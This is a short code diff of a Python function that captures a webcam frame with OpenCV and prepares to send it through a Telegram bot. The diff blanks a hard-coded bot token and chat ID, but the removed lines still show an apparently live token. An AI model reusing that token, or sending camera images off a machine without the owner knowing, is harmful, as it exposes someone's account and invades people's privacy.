@@ -6,8 +6,8 @@ import cv2
 async def send_message():
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
-    BOT_TOKEN = "8367260642:AAHkXDWMXVsdD1ylVA1KOugSAZKdrMReJq8"
-    CHAT_ID = -1003473779656
+    BOT_TOKEN = ""
+    CHAT_ID = 0
     bot = Bot(token=BOT_TOKEN)
     
     if ret:
